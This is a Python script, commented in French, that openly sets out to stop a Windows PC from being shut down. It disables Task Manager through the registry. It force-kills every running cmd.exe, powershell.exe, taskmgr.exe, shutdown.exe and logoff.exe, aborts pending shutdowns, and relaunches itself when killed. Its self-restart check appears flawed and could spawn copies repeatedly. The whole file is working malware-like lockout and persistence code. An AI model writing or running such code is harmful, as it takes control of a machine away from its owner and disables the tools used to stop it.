import ctypes
import os
import time
import winreg
import psutil
import datetime
import getpass
from threading import Thread

LOG_FILE = "shutdown_log.txt"
CPU_THRESHOLD = 90  # Seuil d'utilisation CPU (%) à surveiller
CRITICAL_PROCESSES = {"winlogon.exe", "csrss.exe", "services.exe", "smss.exe", "lsass.exe", "explorer.exe"}
SUSPICIOUS_PROCESSES = {"shutdown.exe", "logoff.exe", "taskmgr.exe", "powershell.exe", "cmd.exe"}

# 1️⃣ Fonction pour enregistrer les logs
def log_attempt(reason, process_name=None, pid=None):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    user = getpass.getuser()
    log_entry = f"[{timestamp}] {reason} | Utilisateur : {user}"
    if process_name and pid:
        log_entry += f" | Processus : {process_name} (PID: {pid})"
    log_entry += "\n"

    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log_entry)
    
    print(log_entry.strip())

# 2️⃣ Désactiver les touches Alt+F4 et Ctrl+Alt+Del via le Registre (nécessite admin)
def disable_shutdown_keys():
    key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as regkey:
            winreg.SetValueEx(regkey, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)  # Désactiver le gestionnaire de tâches
            winreg.SetValueEx(regkey, "ShutdownWithoutLogon", 0, winreg.REG_DWORD, 0)  # Désactiver arrêt sans connexion
            print("[INFO] Protection des raccourcis Windows activée.")
    except Exception as e:
        print(f"[ERREUR] Impossible de modifier le registre : {e}")

# 3️⃣ Annuler tout arrêt en cours
def prevent_shutdown():
    os.system("shutdown -a")  # Annule toute tentative en cours
    print("[INFO] Tentative d'arrêt annulée.")

# 4️⃣ Vérifier l'utilisation CPU et empêcher l'arrêt si elle dépasse le seuil
def monitor_cpu():
    high_cpu_count = 0  # Compteur de dépassements successifs
    while True:
        cpu_usage = psutil.cpu_percent(interval=1)
        
        if cpu_usage > CPU_THRESHOLD:
            high_cpu_count += 1
            if high_cpu_count >= 5:  # Seulement après 5 relevés consécutifs > seuil
                log_attempt(f"Alerte CPU : {cpu_usage}% - Annulation de l'arrêt")
                prevent_shutdown()
        else:
            high_cpu_count = 0  # Réinitialisation du compteur si l'usage CPU baisse
        
        time.sleep(1)

# 5️⃣ Vérifier en boucle les processus qui tentent d'éteindre le PC
def monitor_shutdown():
    print("[INFO] Surveillance activée : le PC ne pourra pas s'éteindre !")

    while True:
        for proc in psutil.process_iter(['pid', 'name']):
            process_name = proc.info['name'].lower() if proc.info['name'] else ""
            if process_name in SUSPICIOUS_PROCESSES and process_name not in CRITICAL_PROCESSES:
                print(f"[ALERTE] Processus suspect détecté : {process_name} (PID: {proc.info['pid']})")
                log_attempt("Tentative d'arrêt détectée", process_name, proc.info['pid'])
                prevent_shutdown()
                os.system(f"taskkill /F /PID {proc.info['pid']}")  # Tue le processus
        time.sleep(1)

# 6️⃣ Éviter la fermeture du script
def protect_script():
    while True:
        running_scripts = [p.info['pid'] for p in psutil.process_iter(['pid', 'name', 'cmdline']) if __file__ in (p.info['cmdline'] or [])]
        if len(running_scripts) < 2:  # Si ce script est tué, il redémarre
            print("[INFO] Redémarrage automatique du script.")
            os.system(f"start /B python {__file__}")
        time.sleep(2)

if __name__ == "__main__":
    disable_shutdown_keys()  # Appliquer les protections
    Thread(target=monitor_cpu, daemon=True).start()  # Lancer la surveillance CPU en arrière-plan
    Thread(target=protect_script, daemon=True).start()  # Auto-protection contre la fermeture
    monitor_shutdown()  # Lancer la surveillance des tentatives d'arrêt
